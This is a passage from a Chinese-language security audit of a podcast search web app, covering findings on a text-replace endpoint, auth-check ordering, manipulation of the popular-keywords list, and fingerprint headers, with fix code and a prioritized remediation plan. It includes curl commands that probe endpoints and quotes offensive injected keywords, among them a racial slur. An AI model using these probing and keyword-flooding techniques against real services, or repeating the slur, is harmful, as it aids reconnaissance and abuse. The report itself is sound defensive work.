1. `replace-text` 加 dry-run mode，回傳「會被改的 segment 數量 + 5 個範例」
2. 加 `confirm_token` 機制：先打 dry-run 拿到 token，再帶 token 才真的改
3. 加大小限制：`old_text` < 100 字、`new_text` < 100 字
4. 對 new_text 做 `html.escape` 或拒絕含 `<` `>` `"` 的輸入（語料中本來就不應出現）

```python
class ReplaceTextRequest(BaseModel):
    old_text: str = Field(min_length=1, max_length=100)
    new_text: str = Field(min_length=0, max_length=100)
    dry_run: bool = True  # 預設 dry-run, 必須明確 false 才真改
    confirm_token: str | None = None  # dry-run 後得到的 token

    @field_validator("new_text")
    @classmethod
    def reject_html(cls, v: str) -> str:
        if any(c in v for c in "<>\"'&"):
            raise ValueError("HTML special characters not allowed")
        return v
```

**參考**：CWE-345 (Insufficient Verification of Data Authenticity)

---

### SEC-12 [🟢 Low] /api/replace-text、/api/corrections/batch-approve 先驗 body 才驗 secret

**檔案**：
- `backend/app/main.py:145-158`（replace-text）
- `backend/app/api/corrections.py:152-162`（batch-approve）

**問題**：FastAPI dependency injection 順序：先解析 body（`body: ReplaceTextRequest`），再進到 function 內檢查 secret。所以無 auth + 無 body 會回 422（"Field required"），不是 403。攻擊者可從 422 vs 403 vs 405 推斷 endpoint 存在。

**重現**：
```bash
$ curl -sX POST "$B/api/replace-text"
{"detail":[{"type":"missing","loc":["body"],"msg":"Field required","input":null}]}

$ curl -sX POST "$B/api/maintenance/reindex"
{"detail":"Invalid secret"}
```

**影響**：極小。openapi.json 已經洩露了 endpoint（SEC-03），這條更小。但好的紀律。

**建議修法**：把 secret 檢查搬到 dependency：

```python
async def require_secret(x_ingest_secret: str = Header(None)):
    if not _check_secret(x_ingest_secret):
        raise HTTPException(status_code=403, detail="Invalid secret")
    return True

@app.post("/api/replace-text")
async def replace_text(
    body: ReplaceTextRequest,
    background_tasks: BackgroundTasks,
    _: bool = Depends(require_secret),
):
    background_tasks.add_task(_run_maintenance, "replace-text", [body.old_text, body.new_text])
    return {"status": ...}
```

FastAPI dependency 在 body 解析前後都會跑，但 `Depends(require_secret)` 失敗會 raise 403 —— 只是還是會看 422 if body 解析早於 dep 注入。要強制先檢 secret，可以把它做成 `APIRouter` 的 dependencies：

```python
admin_router = APIRouter(dependencies=[Depends(require_secret)])

@admin_router.post("/api/replace-text")
async def replace_text(body: ReplaceTextRequest, ...):
    ...

app.include_router(admin_router)
```

**參考**：CWE-204 (Observable Response Discrepancy)

---

### SEC-13 [🟢 Low] popular-keywords 顯示攻擊者可注入的內容（content abuse）

**檔案**：`backend/app/api/search.py:278-297` + `frontend/src/app/page.tsx:166-178`

**問題**：`/api/popular-keywords` 統計 `search_logs.query` table 的 top-N。任何訪客可重複搜某字串讓它登上 7 日熱門（每次 search page=1 都記一次，無 IP 去重）。

實測首頁現在顯示的「7 日熱門」有：`nigger`, `大便`, `色情`, `放屁`, `你很自在` 等明顯被人灌水的關鍵字。React `{k.keyword}` 會 escape HTML，所以**沒有 XSS 風險**（即便有 `<script>` 也只會以文字顯示），但這是內容品質 / 形象問題。

**重現**：用瀏覽器搜 `xxxxx` 個 50 次，過幾天看首頁。

**影響**：
- 首頁形象被攻擊者掌控
- 對小眾關鍵字尤其有效（門檻低，少量 query 就上榜）
- 沒有資安直接後果，但對品牌與使用者體驗影響大
- 如果未來把 popular-keywords 從 `<button>{k.keyword}</button>` 改成 `dangerouslySetInnerHTML`（不太可能，但要防），立刻成為 stored XSS

**建議修法**：

1. **加 IP / session 去重**：每個訪客同 query 在 N 分鐘內只記一次

```python
# 簡單版：用 IP + query 在 5 分鐘內 dedup
from datetime import timedelta

DEDUP_WINDOW = timedelta(minutes=5)

async def _log_search_query(query: str, ip: str | None = None) -> None:
    normalized = (query or "").strip()
    if len(normalized) < MIN_LOGGABLE_QUERY_LEN:
        return
    try:
        async with async_session() as session:
            # Check recent dup
            since = datetime.utcnow() - DEDUP_WINDOW
            existing = await session.execute(
                select(SearchLog.id)
                .where(SearchLog.query == normalized)
                .where(SearchLog.created_at >= since)
                .limit(1)
            )
            if existing.scalar_one_or_none():
                return
            session.add(SearchLog(query=normalized))
            await session.commit()
    except Exception:
        pass
```

2. **加 keyword 黑名單** — 簡單字串清單 + 髒話濾除（中英髒話 list 可用 `profanity-filter` 套件，但要注意維護狀態）

3. **加最小門檻**：query 至少要從 K 個不同 IP 搜過才上榜（但 backend 目前完全不存 IP，這需要調整資料模型）

4. **白名單**：只顯示 `len(keyword) >= 3` 且不全是 ASCII 短字串的 keyword

5. **加 admin 介面手動隱藏不雅關鍵字**（在 search_logs 表加 `is_hidden: bool` 欄位）

**最低成本**：先加 dedup（IP + 5 分鐘）+ 黑名單 + 最小長度 3。

**不要做的修法**：
- ❌ 不要關掉 popular-keywords —— 它是好功能
- ❌ 不要靠前端過濾 —— curl 直接打 backend 還是看得到

**參考**：CWE-841 (Improper Enforcement of Behavioral Workflow)

---

### SEC-14 [🟢 Low] x-powered-by: Next.js 與其他指紋洩漏

**檔案**：`frontend/next.config.ts`

**問題**：response 帶 `x-powered-by: Next.js`、`server: railway-edge`、`x-nextjs-cache: HIT`、`x-nextjs-prerender: 1`、`x-railway-edge: ...` 等指紋 header。

**影響**：
- 攻擊者快速知道技術棧、選對 0-day
- Railway 自己加的 header 不在我們可控範圍（要跟 Railway 報，或他們本來就會去掉）
- `x-powered-by: Next.js` 我們可以拿掉

**建議修法**：

```typescript
// next.config.ts
const nextConfig: NextConfig = {
  output: "standalone",
  poweredByHeader: false,  // ← 加這行
};
```

**參考**：OWASP Server Banner

---

## 整體建議

### 立即修（影響上線安全） — Critical
- **SEC-01** Stored XSS：後端 escape highlighted_text（最重要，連動 SEC-10、SEC-11）
- **SEC-02** CORS 反射任意 origin：把 `cors_origins` 從 `["*"]` 改成具名清單

### 短期修（一週內） — High
- **SEC-03** 關掉 production 的 /docs、/redoc、/openapi.json
- **SEC-04** show 參數 white-list（或 Meilisearch filter escape）
- **SEC-05** Admin secret 改用 Authorization header，不走 URL query
- **SEC-06** Secret 比對改 `secrets.compare_digest()`

### 下個 iteration — Medium
- **SEC-07** 補齊 HTTP 安全 headers（HSTS / CSP / X-Frame-Options / etc）
- **SEC-08** /api/text-count 拒絕 null byte，加 max_length
- **SEC-09** /api/corrections POST 加 rate limit、Pydantic max_length、frontend maxLength
- **SEC-10** RSS 描述 HTML 處理（部分由 SEC-01 連帶解決）
- **SEC-11** /api/replace-text 加 dry-run + confirm + html 字元拒絕

### Backlog — Low
- **SEC-12** Admin POST 端點檢查順序（secret first then body）
- **SEC-13** popular-keywords 內容濫用（IP dedup + 黑名單）
- **SEC-14** poweredByHeader: false

### 推薦修補順序（最少代碼最高 impact）
1. **SEC-01 + SEC-10 一起**：後端 `_format_hit` 加 `_safe_highlight()` 函式（10 行代碼，斷掉整條 stored XSS 鏈）
2. **SEC-02**：env var 改 `GUCHI_CORS_ORIGINS` JSON list（1 行 config 改）
3. **SEC-03**：`docs_url=None, redoc_url=None, openapi_url=None`（3 行）
4. **SEC-06**：`secrets.compare_digest`（grep + replace，10 行）
5. **SEC-07**：Frontend 加 `headers()`（30 行 next.config.ts）
6. **SEC-04**：show white-list（5 行 search.py）
7. **SEC-05**：Authorization header 改寫（前後端合計 ~30 行）
8. 其餘排 backlog

---

## 不在此次範圍

- **POST endpoint 注入測試**（`/api/corrections`、`/api/replace-text`、`/api/maintenance/*`、`/api/corrections/{id}/approve|reject`、`/api/corrections/batch-approve`）— 紅線禁止寫入 prod，需 staging 環境跑
- **Admin 已登入態下的 CSRF 與 token rotation** — 紅線禁止登入
- **並發 / 壓力測試 / DoS payload** — 紅線
- **第三方依賴 CVE 掃描** — 沒在範圍內，但建議跑一次 `pip-audit` + `npm audit`
- **跨瀏覽器 / 真機網路條件** — 本輪只在 macOS Chromium
- **SoundOn audio CDN 安全性** — 不在控制範圍
- **Railway 平台層的 IAM、token rotation、deploy key 管理** — 平台級別

---

## 測試紀錄（供開發者驗證）

- 共執行 ~70 次 GET request 到 production（無 POST 寫入）
- 用 Playwright 在 frontend 攔截 fetch 做 1 次受控 XSS PoC（不打後端）
- 代碼審查覆蓋檔案：
  - `backend/app/main.py`
  - `backend/app/api/search.py`
  - `backend/app/api/corrections.py`
  - `backend/app/core/config.py`
  - `backend/app/core/database.py`
  - `backend/app/core/search.py`
  - `backend/app/services/rss_parser.py`
  - `backend/app/services/indexer.py`
  - `backend/app/scripts/ingest.py`
  - `backend/app/models/episode.py`
  - `backend/requirements.txt`
  - `frontend/src/app/layout.tsx`
  - `frontend/src/app/page.tsx`
  - `frontend/src/app/episode/[id]/page.tsx`
  - `frontend/src/app/admin/page.tsx`
  - `frontend/src/components/SearchResults.tsx`
  - `frontend/src/lib/api.ts`
  - `frontend/next.config.ts`
- 截圖：`qa-reports/screenshots/security-round2/sec-xss-poc.png`
- 測試耗時：~80 分鐘
- 沒有對 production DB 造成任何寫入
